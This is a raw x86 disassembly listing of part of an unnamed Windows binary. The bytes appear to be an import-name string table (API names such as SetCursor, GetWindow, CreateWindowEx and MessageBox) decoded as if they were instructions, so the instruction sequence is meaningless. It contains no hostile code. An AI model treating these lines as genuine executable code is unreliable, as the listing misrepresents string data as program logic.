  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
